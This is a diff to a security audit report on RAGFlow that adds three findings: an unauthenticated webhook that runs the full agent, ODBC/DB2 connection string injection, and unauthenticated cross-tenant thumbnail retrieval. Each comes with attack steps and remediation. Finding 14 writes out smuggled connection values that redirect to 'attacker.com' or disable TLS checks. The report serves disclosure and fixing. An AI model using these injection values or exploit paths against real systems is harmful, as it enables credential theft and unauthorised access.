@@ -9,7 +9,7 @@
 
 ## Executive Summary
 
-This report presents the findings of a source-level and dynamic security audit of the RAGFlow codebase. Twelve independent, critical-to-high severity vulnerabilities were identified, each confirmed with a working proof-of-concept exploit script. The vulnerabilities span authentication, serialization, access control, server-side request forgery, container security, SQL injection, cross-site scripting, and unsafe template rendering — multiple attack paths lead to remote code execution (RCE) without elevated privilege.
+This report presents the findings of a source-level and dynamic security audit of the RAGFlow codebase. Fifteen independent, critical-to-high severity vulnerabilities were identified, each confirmed with a working proof-of-concept exploit script. The vulnerabilities span authentication, serialization, access control, server-side request forgery, container security, SQL injection, cross-site scripting, and unsafe template rendering — multiple attack paths lead to remote code execution (RCE) without elevated privilege. Findings 13-15 cover unauthenticated webhook execution, ODBC connection string injection, and unauthenticated bulk thumbnail retrieval.
 
 The most severe findings are three distinct RCE vectors (findings 2, 4, and a component of finding 1) that can be triggered by any attacker who obtains write access to the MySQL database, which itself uses default credentials committed to the repository. Findings 6 and 9 are additionally CRITICAL: finding 6 allows unauthenticated file write to any user's storage bucket, and finding 9 combines a security checker bypass with a privileged container configuration that enables Docker host escape. Finding 10 reveals a CRITICAL SQL injection in the ExeSQL agent tool where user chat messages flow directly into `cursor.execute()` with trivially bypassable filtering.
 
@@ -40,6 +40,9 @@ The most severe findings are three distinct RCE vectors (findings 2, 4, and a co
 | 10 | SQL Injection in ExeSQL Agent Tool | **CRITICAL** | Yes | `10_exesql_sqli.py` |
 | 11 | Stored XSS via Malicious DOCX Preview | **HIGH** | Yes | `11_stored_xss_docx.py` |
 | 12 | User-Controlled Server-Side Template Rendering | **MEDIUM** | Yes | `12_jinja2_sandbox_bypass.py` |
+| 13 | Unauthenticated Webhook Triggers Full Agent Execution | **HIGH** | Yes | `13_unauth_webhook_execution.py` |
+| 14 | ODBC/CLI Connection String Injection in MSSQL and DB2 | **HIGH** | Yes | `14_odbc_connstr_injection.py` |
+| 15 | Unauthenticated Bulk Document Thumbnail Retrieval | **HIGH** | Yes | `15_unauth_bulk_thumbnails.py` |
 
 ---
 
@@ -591,6 +594,120 @@ Expected output: `RESULT: CONFIRMED (user-controlled SSTR confirmed, current byp
 
 ---
 
+### Finding 13: Unauthenticated Webhook Triggers Full Agent Execution
+
+**Severity:** HIGH (CVSS 7.6 — AV:N/AC:L/PR:N/UI:N/S:U/C:L/I:L/A:H)
+
+**Affected Component:** `api/apps/restful_apis/agent_api.py`
+
+**Affected Files and Lines:**
+- `api/apps/restful_apis/agent_api.py:1058-1060` — route definition with no `@login_required`
+- `api/apps/restful_apis/agent_api.py:1114-1117` — `auth_type = security_cfg.get("auth_type", "none")` and `if auth_type == "none": return`
+- `api/apps/restful_apis/agent_api.py:1312` — `Canvas(dsl, cvs.user_id, agent_id)` — canvas runs under owner identity
+
+**Description:**
+
+The webhook endpoint accepts `POST`/`GET`/`PUT`/`PATCH`/`DELETE`/`HEAD` on `/api/v1/agents/<agent_id>/webhook` with no `@login_required` decorator. The security configuration defaults to `auth_type: "none"` (line 1114), which causes the security validator to return immediately without any authentication check (lines 1116-1117). When triggered, the endpoint creates a full Canvas execution under the agent owner's identity (line 1312: `Canvas(dsl, cvs.user_id, agent_id)`), running all configured tools (ExeSQL, Invoke, file operations) and consuming LLM API credits. While webhooks are designed for external triggers, the insecure default combined with full pipeline execution under the owner's identity creates a significant abuse vector.
+
+**Attack Scenario:**
+
+1. Attacker enumerates or guesses `agent_id` (UUIDs may be leaked via other endpoints or logs).
+2. Attacker sends `POST /api/v1/agents/<agent_id>/webhook` with no authentication headers.
+3. Full agent pipeline executes under the agent owner's identity.
+4. LLM API costs are billed to the owner; configured tools execute (ExeSQL, file operations, HTTP Invoke); any agent output containing sensitive data is accessible.
+
+**PoC:**
+
+```bash
+python autofyn_audit/exploits/13_unauth_webhook_execution.py
+```
+
+Expected output: `RESULT: CONFIRMED (static analysis)` or `RESULT: CONFIRMED (dynamic)` when server is live.
+
+**Remediation:**
+
+1. Change the default `auth_type` from `"none"` to `"token"`, requiring explicit opt-in for unauthenticated webhooks.
+2. Require explicit configuration with a UI warning when `auth_type: "none"` is selected.
+3. Add rate limiting as a mandatory (not optional) default, regardless of `auth_type`.
+
+---
+
+### Finding 14: ODBC/CLI Connection String Injection in MSSQL and DB2
+
+**Severity:** HIGH (CVSS 7.4 — AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:L/A:N)
+
+**Affected Component:** `agent/tools/exesql.py`
+
+**Affected Files and Lines:**
+- `agent/tools/exesql.py:136-144` — MSSQL ODBC connection string via string concatenation
+- `agent/tools/exesql.py:186-195` — DB2 CLI connection string via f-string interpolation
+
+**Description:**
+
+The ExeSQL tool builds ODBC (MSSQL) and CLI (DB2) connection strings by concatenating user-controlled configuration values (`host`, `database`, `username`, `password`) directly into semicolon-delimited connection strings. No sanitization removes or escapes semicolons in these values. An attacker with agent workflow edit access can inject additional ODBC/CLI key-value pairs by embedding semicolons in any connection parameter. This is distinct from Finding 10 (SQL query injection via `cursor.execute()`): this finding covers connection parameter injection that executes before any SQL query, targeting the ODBC driver layer.
+
+**Attack Scenarios:**
+
+1. `database = "mydb;SERVER=attacker.com"` — redirects connection to attacker server, capturing credentials.
+2. `password = "x;TRUSTED_CONNECTION=yes"` — enables Windows integrated auth bypass.
+3. `host = "legit.db;Encrypt=no;TrustServerCertificate=yes"` — disables TLS certificate verification, enabling MITM.
+4. `database = "mydb;HOSTNAME=attacker.com"` (DB2) — redirects CLI connection to attacker server.
+
+**PoC:**
+
+```bash
+PYTHONPATH=. python autofyn_audit/exploits/14_odbc_connstr_injection.py
+```
+
+Expected output: `RESULT: CONFIRMED`
+
+**Remediation:**
+
+1. Use parameterized connection APIs (e.g., `pyodbc.connect(driver=..., server=..., database=...)` keyword arguments) instead of string concatenation.
+2. Validate all connection parameters: strip semicolons and reject values containing ODBC keywords before building connection strings.
+3. For DB2, use `ibm_db.connect(database, uid, pwd)` positional arguments instead of the CLI connection string format.
+
+---
+
+### Finding 15: Unauthenticated Bulk Document Thumbnail Retrieval
+
+**Severity:** HIGH (CVSS 7.5 — AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N)
+
+**Affected Component:** `api/apps/restful_apis/document_api.py`
+
+**Affected Files and Lines:**
+- `api/apps/restful_apis/document_api.py:1182-1183` — route with no `@login_required`
+- `api/apps/restful_apis/document_api.py:1204-1209` — `doc_ids = request.args.getlist("doc_ids")` → `DocumentService.get_thumbnails(doc_ids)` — no `tenant_id` passed
+- `api/apps/restful_apis/document_api.py:1213` — response includes `kb_id` — cross-tenant metadata leak
+- `api/db/services/document_service.py:769-773` — `get_thumbnails()` queries by `id` only, no tenant filter
+
+**Description:**
+
+The `/api/v1/thumbnails` endpoint serves thumbnail data for any document IDs without authentication or tenant authorization. It accepts bulk `doc_ids` via query parameters and calls `DocumentService.get_thumbnails(doc_ids)` with no tenant filtering — returning thumbnails for documents across all tenants. The response includes `kb_id` (knowledge base IDs), leaking internal resource identifiers. This is distinct from Finding 5 (unauthenticated image retrieval at `/documents/images/<id>`): Finding 5 requires a specific `bucket-object` pair and returns raw image bytes for a single document. This endpoint accepts bulk document UUIDs, returns structured metadata including `kb_id`, and operates cross-tenant.
+
+**Attack Scenario:**
+
+1. Attacker enumerates document UUIDs (predictable format, or leaked via other unauthenticated endpoints).
+2. Attacker sends `GET /api/v1/thumbnails?doc_ids=<uuid1>&doc_ids=<uuid2>...` without authentication.
+3. Server returns thumbnails and `kb_id` for all matching documents across all tenants.
+4. Attacker harvests document thumbnail previews and maps knowledge base relationships across tenants.
+
+**PoC:**
+
+```bash
+python autofyn_audit/exploits/15_unauth_bulk_thumbnails.py
+```
+
+Expected output: `RESULT: CONFIRMED (static analysis)` or `RESULT: CONFIRMED (dynamic)` when server is live.
+
+**Remediation:**
+
+1. Add `@login_required` and `@add_tenant_id_to_kwargs` decorators to the `/thumbnails` endpoint.
+2. Pass `tenant_id` to `DocumentService.get_thumbnails()` and filter the query by tenant.
+3. Audit all document endpoints for missing authentication decorators.
+
+---
+
 ## Infrastructure Notes
 
 Default credentials committed to the repository (`docker/.env`) enable direct database access:
@@ -641,4 +758,9 @@ python autofyn_audit/exploits/09_privileged_sandbox_escape.py
 PYTHONPATH=. python autofyn_audit/exploits/10_exesql_sqli.py
 python autofyn_audit/exploits/11_stored_xss_docx.py
 PYTHONPATH=. python autofyn_audit/exploits/12_jinja2_sandbox_bypass.py
+
+# Exploits 13-15: mixed static + dynamic analysis
+python autofyn_audit/exploits/13_unauth_webhook_execution.py
+PYTHONPATH=. python autofyn_audit/exploits/14_odbc_connstr_injection.py
+python autofyn_audit/exploits/15_unauth_bulk_thumbnails.py
 ```
